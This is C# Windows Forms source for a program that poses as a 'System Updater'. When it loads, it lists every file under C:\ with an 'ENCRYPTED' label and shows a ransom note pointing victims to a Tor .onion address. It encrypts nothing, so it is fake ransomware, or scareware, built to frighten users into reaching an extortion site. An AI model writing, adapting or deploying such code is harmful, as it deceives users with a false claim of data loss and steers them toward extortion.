using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
//using System.Collections.Generic;

namespace System_Updater
{
    public partial class Updating : Form
    {
        public List<string> fl = new List<string>();
        public Updating()
        {
            InitializeComponent();
        }

        private void Updating_Load(object sender, EventArgs e)
        {
            DirSearch("c:\\");

            Task task1 = new Task(new Action(Scroll));
            task1.Start();

            AddText();

            textBox1.AppendText(Environment.NewLine);
            textBox1.AppendText("Your files have been encrypted with miliarty grade encryption algorithms. To recover your files download the Tor browser and follow instructions found at the following link: http://skunkrdunsylcfqd.onion/");
        }

        void DirSearch(string sDir)
        {
            try
            {
                foreach (string d in Directory.GetDirectories(sDir))
                {
                    foreach (string f in Directory.GetFiles(d))
                    {
                        fl.Add("ENCRYPTED: " + f);
                    }
                    DirSearch(d);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        void Scroll()
        {
            this.Invoke(new MethodInvoker(delegate()
            {
                textBox1.SelectionStart = textBox1.Text.Length;
                textBox1.ScrollToCaret();
            }));
        }

        void AddText()
        {
            foreach (string f in fl)
            {
                textBox1.AppendText(f);
                textBox1.AppendText(Environment.NewLine);
            }
        }

    }
}